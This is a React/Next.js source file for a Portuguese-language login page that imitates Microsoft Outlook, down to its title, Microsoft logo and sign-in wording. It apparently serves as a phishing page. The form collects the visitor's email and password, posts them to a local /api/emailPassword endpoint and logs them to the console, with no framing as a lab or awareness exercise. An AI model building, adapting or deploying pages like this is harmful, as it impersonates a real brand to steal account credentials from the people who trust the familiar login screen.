"use client"; 

import { useState } from 'react';
import Head from 'next/head';
import styles from './page.module.css';

export default function Page() {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleEmailSubmit = (e: any) => {
    e.preventDefault();
    if (email) {
      setStep(2);
    }
  };

  const handlePasswordSubmit = async (e: any) => {
    e.preventDefault();

    const response = await fetch('/api/emailPassword', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email, password }),
    });

    const data = await response.json();
    console.log(data);

    if (response.ok) {
      console.log('Login:', email, 'Password:', password);
    } else {
      console.error('Erro ao enviar os dados');
    }
  };

  return (
    <div className={styles.container}>
      <Head>
        <title>Login - Outlook</title>
        <meta name="description" content="Outlook Login Page" />
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <h1 className={styles.outlookTitle}>Outlook</h1>

      <main className={styles.main}>
        <div className={styles.loginContainer}>
          <div className={styles.logo}>
            <img src="/logo.png" alt="Microsoft Logo" width="24" height="24" />
            <span>Microsoft</span>
          </div>
          
          <h2 className={styles.title}>Entrar</h2> 

          <p className={styles.outlookText}>Continuar para Outlook</p>

        
          {step === 1 ? (
            <form onSubmit={handleEmailSubmit} className={styles.form}>
              <input
                type="text"
                id="email"
                name="email"
                placeholder="Email, telefone ou Skype"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
              <button type="submit">Avançar</button>
            </form>
          ) : (
            <form onSubmit={handlePasswordSubmit} className={styles.form}>
              <input
                type="password"
                id="password"
                name="password"
                placeholder="Senha"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <button type="submit">Entrar</button>
            </form>
          )}

          <div className={styles.links}>
            {step === 1 ? (
              <a href="#">Não tem uma conta? <strong>Crie uma!</strong></a>
            ) : (
              <a href="#">Esqueceu sua senha?</a>
            )}
          </div>
        </div>
      </main>

      <div className={styles.options}>
        <button>
          <img src="/key.svg" alt="Options Icon" width="32" height="32" />
          <span>Opções de entrada</span>
        </button>
      </div>
    </div>
  );
}
